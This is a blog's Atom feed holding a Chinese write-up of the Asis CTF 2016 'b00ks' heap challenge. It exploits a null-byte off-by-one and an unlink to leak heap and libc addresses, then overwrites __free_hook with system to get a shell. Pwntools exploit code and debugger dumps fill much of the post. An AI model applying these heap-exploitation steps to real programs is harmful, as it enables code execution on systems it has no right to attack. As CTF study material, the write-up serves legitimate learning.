<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Frdqy的博客</title>
  
  <subtitle>记录默默到无闻的学习路</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-02-26T16:29:53.003Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Frdqy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Asis 2016 b00ks</title>
    <link href="http://yoursite.com/2020/02/27/Asis-2016-b00ks/"/>
    <id>http://yoursite.com/2020/02/27/Asis-2016-b00ks/</id>
    <published>2020-02-26T16:28:58.000Z</published>
    <updated>2020-02-26T16:29:53.003Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>许久没有练习pwn题了，今天拿一道堆题练练手，漏洞点在Null byte off-by-one以及unlink。</p><p>题目来源(包括exp)：Asis CTF 2016 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks" target="_blank" rel="noopener">b00ks</a></p><a id="more"></a><h3 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h3><p>64位小端序程序，除了canary保护全开。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">   RELRO:    Full RELRO</span><br><span class="line">   Stack:    No canary found</span><br><span class="line">   NX:       NX enabled</span><br><span class="line">   PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#首先打印出欢迎字段并要求输入用户名</span></span><br><span class="line">Welcome to ASISCTF book library</span><br><span class="line">Enter author name:</span><br><span class="line"></span><br><span class="line"><span class="comment">#之后打印出常见的菜单程序，包括创建、删除、编辑、打印、改变用户名，注意有打印就可能存在方便泄露的地方</span></span><br><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#可见需要我们输入书名，可自定义大小，但最大32字符</span></span><br><span class="line"><span class="comment">#允许输入描述信息大小，好像没限制大小，在汇编看看</span></span><br><span class="line">Enter book name size: 10</span><br><span class="line">Enter book name (Max 32 chars): aaaa</span><br><span class="line"></span><br><span class="line">Enter book description size: 10</span><br><span class="line">Enter book description: aaa</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//发现并没有限制描述大小</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nEnter book description size: "</span>, *(_QWORD *)&amp;v1);</span><br><span class="line">        __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//book结构体，存放在bss段的数组中</span></span><br><span class="line"><span class="keyword">if</span> ( v3 )</span><br><span class="line">&#123;</span><br><span class="line">  *((_DWORD *)v3 + <span class="number">6</span>) = v1;<span class="comment">//描述信息大小，注意此处DWORD+6=QWORD+3，2*6=3*4</span></span><br><span class="line">  *((_QWORD *)off_202010 + v2) = v3;<span class="comment">//bss上数组保存当前malloc地址，即存储book结构体数组</span></span><br><span class="line">  *((_QWORD *)v3 + <span class="number">2</span>) = v5;<span class="comment">//描述信息，malloc的地址</span></span><br><span class="line">  *((_QWORD *)v3 + <span class="number">1</span>) = ptr;<span class="comment">//书名，malloc的地址</span></span><br><span class="line">  *(_DWORD *)v3 = ++unk_202024;<span class="comment">//序号</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//值得注意的是它所有的内容输入都通过一个自定义函数实现，末尾边界处存在溢出</span></span><br><span class="line"><span class="comment">//看出for循环下标从0开始，而当输入为换行或者下标等于a2时退出，此处a2为输入大小-1，但是由于从0开始导致下标为31时已经输入了32个字符，且最后一个*buf = 0导致溢出了一个null字符。</span></span><br><span class="line"><span class="comment">//注意输入Auther时a2为32，说明此时可以输入33个</span></span><br><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_9F5</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="string">'\n'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">Enter the book id you want to delete: 1</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//free后都置null了，暂时没有UAF等利用</span></span><br><span class="line"><span class="keyword">if</span> ( i != <span class="number">20</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(*((_QWORD *)off_202010 + i) + <span class="number">8L</span>L));<span class="comment">//书名</span></span><br><span class="line">  <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(*((_QWORD *)off_202010 + i) + <span class="number">16L</span>L));<span class="comment">//描述信息</span></span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)off_202010 + i));<span class="comment">//释放当前块</span></span><br><span class="line">  *((_QWORD *)off_202010 + i) = <span class="number">0L</span>L;<span class="comment">//置0</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a>编辑</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#编辑可以用来修改描述信息</span></span><br><span class="line">3</span><br><span class="line">Enter the book id you want to edit: 1</span><br><span class="line">Enter new book description: bbb</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Enter new book description: "</span>, &amp;v1);</span><br><span class="line"><span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_9F5(</span><br><span class="line">                      *(_BYTE **)(*((_QWORD *)off_202010 + i) + <span class="number">16L</span>L),</span><br><span class="line">                      *(_DWORD *)(*((_QWORD *)off_202010 + i) + <span class="number">24L</span>L) - <span class="number">1</span>) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br></pre></td></tr></table></figure><h4 id="打印"><a href="#打印" class="headerlink" title="打印"></a>打印</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; 4</span><br><span class="line">ID: 1</span><br><span class="line">Name: aa</span><br><span class="line">Description: aa</span><br><span class="line">Author: aaa</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//直接打印，且只判断ID不为0则打印</span></span><br><span class="line"><span class="comment">//注意printf打印时根据\x00来判断是否截断</span></span><br><span class="line">v0 = *((_QWORD *)off_202010 + i);</span><br><span class="line"><span class="keyword">if</span> ( v0 )<span class="comment">//ID不为0则打印</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"ID: %d\n"</span>, **((<span class="keyword">unsigned</span> <span class="keyword">int</span> **)off_202010 + i));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name: %s\n"</span>, *(_QWORD *)(*((_QWORD *)off_202010 + i) + <span class="number">8L</span>L));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Description: %s\n"</span>, *(_QWORD *)(*((_QWORD *)off_202010 + i) + <span class="number">16L</span>L));</span><br><span class="line">  LODWORD(v0) = <span class="built_in">printf</span>(<span class="string">"Author: %s\n"</span>, off_202018);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>首先需要说明，由于程序开启了PIE导致代码段和堆段地址随机，只有低三个字节是不变的，并且调试过程中多次重启程序改断点调试，因此地址变化很大，请以实际调试为主。</p><p>首先可以看到申请一个book会创建3个chunk，由低到高分别是name(0x5583b53ef020)、description(0x5583b53ef050)、book结构体(0x5583b53ef080)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x5583b53ef010</span><br><span class="line">0x5583b53ef010:0x00000000000000000x0000000000000031</span><br><span class="line">0x5583b53ef020:0x00317463656a626f0x0000000000000000</span><br><span class="line">0x5583b53ef030:0x00000000000000000x0000000000000000</span><br><span class="line">0x5583b53ef040:0x00000000000000000x0000000000000031</span><br><span class="line">0x5583b53ef050:0x00317463656a626f0x0000000000000000</span><br><span class="line">0x5583b53ef060:0x00000000000000000x0000000000000000</span><br><span class="line">0x5583b53ef070:0x00000000000000000x0000000000000031</span><br><span class="line">0x5583b53ef080:0x00000000000000010x00005583b53ef020</span><br><span class="line">0x5583b53ef090:0x00005583b53ef0500x0000000000000020</span><br><span class="line">0x5583b53ef0a0:0x00000000000000000x0000000000020f61</span><br></pre></td></tr></table></figure><p>然后由于Auther和book结构体数组保存在bss上，且Auther输入也是使用自定义的输入函数，并且这两个部分是相邻的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#此处直接搜索Auther的内容即可找到</span></span><br><span class="line">pwndbg&gt; search <span class="string">'aaaa'</span></span><br><span class="line">b00ks           0x562085e59040 0x6161616161616161 (<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">b00ks           0x562085e59044 0x6161616161616161 (<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">b00ks           0x562085e59048 0x6161616161616161 (<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">b00ks           0x562085e5904c 0x6161616161616161 (<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">b00ks           0x562085e59050 0x6161616161616161 (<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">b00ks           0x562085e59054 0x6161616161616161 (<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">b00ks           0x562085e59058 0x6161616161616161 (<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">b00ks           0x562085e5905c 0x8759a08061616161</span><br><span class="line"></span><br><span class="line"><span class="comment">#可见Auther和book结构体数组相邻，原因在于输入的32个a末尾还有一个0放在60处，但是后来创建book后覆盖掉了</span></span><br><span class="line"><span class="comment">#因此可以直接打印Auther就可以打印出堆地址</span></span><br><span class="line">pwndbg&gt; x/20gx 0x562085e59040</span><br><span class="line">0x562085e59040:0x61616161616161610x6161616161616161</span><br><span class="line">0x562085e59050:0x61616161616161610x6161616161616161</span><br><span class="line">0x562085e59060:0x000056208759a0800x0000000000000000</span><br></pre></td></tr></table></figure><p>好了，现在已经可以拿到堆地址了。关注到change功能可以修改Auther的名字，那么我们可以使用change修改Auther将第一个book结构体的地址的最低位覆盖为第一个book的description部分，因为这里输入不受限制方便伪造一个book结构体。</p><p>到此我们可以控制一个book结构体，他的内容包括id、书名的malloc地址、description的malloc地址，因此再下次edit时可以手动往我们指定的伪造的book中的description地址中写数据，从而达到任意地址写。</p><p>好了，到这里我们已经拥有了任意地址写的能力，但是还有一个问题：如何泄露libc基地址？我们任意地址写的话一般写got表也好，写malloc_hook或者free_hook也好，都因为ASLR需要计算libc基地址来进行偏移地址的计算。因此我们需要在堆上找到libc偏移，首先需要直到堆的基址，通过top chunk以及泄露的第一个chunk可以算出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#top chunk地址</span></span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">0x555c627ef000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 4113, </span><br><span class="line">  fd = 0xa3233, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算堆的起始偏移为0x1080，用第一个book的首地址与top chunk首地址之差来计算</span></span><br><span class="line">pwndbg&gt; distance 0x0000555c627f0080 0x555c627ef000</span><br><span class="line">0x555c627f0080-&gt;0x555c627ef000 is -0x1080 bytes (-0x210 words)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#前半部分实现泄露堆地址</span></span><br><span class="line">createname(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">createbook(<span class="number">0x20</span>,<span class="string">'a'</span>,<span class="number">0x20</span>,<span class="string">'b'</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">'4'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Author:'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">book1_addr = io.recv(<span class="number">6</span>)</span><br><span class="line">book1_addr = u64(book1_addr.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_base = book1_addr - <span class="number">0x1080</span></span><br></pre></td></tr></table></figure><p>接着需要申请两个chunk再释放掉，为了让其进入fastbin后出来是反过来的，即再申请的时候先分配原3号块的地址(高位地址分配给4号chunk)，然后再分配原来的低位地址给5号chunk，从而unlink 5号块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'buf 1'</span>, <span class="number">0x20</span>, <span class="string">'desc buf'</span>) <span class="comment"># 2</span></span><br><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'buf 2'</span>, <span class="number">0x20</span>, <span class="string">'desc buf 2'</span>) <span class="comment"># 3</span></span><br><span class="line">deletebook(<span class="number">2</span>)</span><br><span class="line">deletebook(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>下面在编号为4的describe中构建一个chunk，该chunk需要伪造出ptr指针指向该chunk从而过unlink保护。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">这里写chunk4的description，一直写到chunk5的</span></span><br><span class="line">ptr = heap_base + 0x1180</span><br><span class="line">payload = p64(0)</span><br><span class="line">payload += p64(0x101)</span><br><span class="line">payload += p64(ptr - 0x18)</span><br><span class="line">payload += p64(ptr - 0x10)</span><br><span class="line">payload += '\x00' * 0xe0</span><br><span class="line">payload += p64(0x100)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">本次调试book4结构体地址，通过搜索Auther填写的字符串来定位book结构体数组</span></span><br><span class="line">0x000056448bac5170</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">定位book4具体结构，其中0x000056448bac51d0是要写入chunk的地址</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x000056448bac5170</span></span><br><span class="line">0x56448bac5170:0x00005644000000040x000056448bac51a0</span><br><span class="line">0x56448bac5180:0x000056448bac51d00x0000000000000108</span><br><span class="line">0x56448bac5190:0x00000000000000000x0000000000000031</span><br><span class="line">    </span><br><span class="line"><span class="meta">#</span><span class="bash">具体chunk填充内容，其中fd和bk地址分别是ptr-0x18和ptr-0x10，因此ptr为了过保护必须指向0x000056448bac51d0，所以ptr为地址0x56448bac5180的值</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x000056448bac51d0</span></span><br><span class="line">0x56448bac51d0:0x00000000000000000x0000000000000101</span><br><span class="line">0x56448bac51e0:0x000056448bac51680x000056448bac5170</span><br><span class="line">0x56448bac51f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x56448bac5200:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>注意4、5、6三个块的申请如下，6号块为了放置unlink 4和5时合并到top chunk中去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'name'</span>, <span class="number">0x108</span>, <span class="string">'overflow'</span>) <span class="comment"># 4</span></span><br><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'name'</span>, <span class="number">0x100</span> - <span class="number">0x10</span>, <span class="string">'target'</span>) <span class="comment"># 5</span></span><br><span class="line">createbook(<span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>, <span class="number">0x200</span>, <span class="string">'to arbitrary read write'</span>) <span class="comment"># 6</span></span><br></pre></td></tr></table></figure><p>在unlink时，下图为第五块的description，他被释放时会根据size字段最后一位判断前一个块是否空闲，通过pre_size字段找到前一个块，因此这里两个都空闲会触发unlink操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chunk5-&gt;description</span></span><br><span class="line">pwndbg&gt; x/20xg 0x0000564f5602c2e0-0x10</span><br><span class="line">0x564f5602c2d0:0x00000000000001000x0000000000000100</span><br><span class="line">0x564f5602c2e0:0x00007465677261740x0000000000000000</span><br><span class="line"></span><br><span class="line"><span class="comment">#chunk4-&gt;description，已被事先伪造好</span></span><br><span class="line">pwndbg&gt; x/20xg 0x0000564f5602c2e0-0x10-0x100</span><br><span class="line">0x564f5602c1d0:0x00000000000000000x0000000000000101</span><br><span class="line">0x564f5602c1e0:0x0000564f5602c1680x0000564f5602c170</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink后ptr地址的值会变为ptr-0x18，即地址180的值会变为168</span></span><br><span class="line"><span class="comment">#可以看到chunk4的description地址被改为168</span></span><br><span class="line">pwndbg&gt; x/20gx 0x0000564d8444f180-0x10</span><br><span class="line">0x564d8444f170:0x0000564d000000040x0000564d8444f1a0</span><br><span class="line">0x564d8444f180:0x0000564d8444f1680x0000000000000108</span><br></pre></td></tr></table></figure><p>经过unlink后地址168的值便是chunk4的description的地址，那么我们修改它就是修改description的值，将该chunk的descrip改为chunk6的description。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(heap_base + <span class="number">0x11a0</span>)<span class="comment">#chunk4 name的固定偏移</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x10c0</span>)<span class="comment">#chunk6 description地址的固定偏移</span></span><br><span class="line">payload += <span class="string">'\n'</span></span><br><span class="line"></span><br><span class="line">editbook(<span class="number">4</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#这个时候就可以向chunk4写description，然后通过写chunk6来修改chunb4的description的内容</span></span><br></pre></td></tr></table></figure><p>记得上面unlink时是一个samll bin大小的块，因此会被放入unsorted bin中暂存，并且由于有chunk6的存在不会和top chunk合并，因此它的fd和bk会泄露libc地址，该libc地址一般为main_arena+88的地址，因此可以算出main_arena的地址，并且由于main_arena在libc的偏移不变(定义于malloc_trim函数中，使用ida搜函数可以查看到常量)，此处偏移为0x3c4b78，即可算出libc基址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将地址送到chunk4中的description起始是chunk6的description地址位置，然后读出来</span></span><br><span class="line"><span class="comment">#此处将main_arena+88的地址写入，然后将该地址读出来算出libc基址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_at</span><span class="params">(addr)</span>:</span></span><br><span class="line">    editbook(<span class="number">4</span>, p64(addr))</span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">    content = io.recvline()[:<span class="number">-1</span>]</span><br><span class="line">    io.info(content)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="comment">#算出libc基址，heap_base + 0x11e0是unlink后的块</span></span><br><span class="line">libc_leak = u64(read_at(heap_base + <span class="number">0x11e0</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br></pre></td></tr></table></figure><p>拿到libc基址后就可以随便玩了，这里向free_hook写system，最后删除chunk6即可，删除时会free name、description和book结构体，在free name时由于name为/bin/sh，刚好作为system参数使用。当然这里也可以直接用one_gaget写入，效果一样。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#算出free_hook地址</span></span><br><span class="line">addr=libc_leak + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">content=p64(libc_leak + libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#将free_hook地址写入chunk6的description地址处</span></span><br><span class="line">editbook(<span class="number">4</span>, p64(addr))</span><br><span class="line"><span class="comment">#修改free_hook内容为system函数</span></span><br><span class="line">editbook(<span class="number">6</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#触发system('/bin/sh')</span></span><br><span class="line">deletebook(<span class="number">6</span>)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 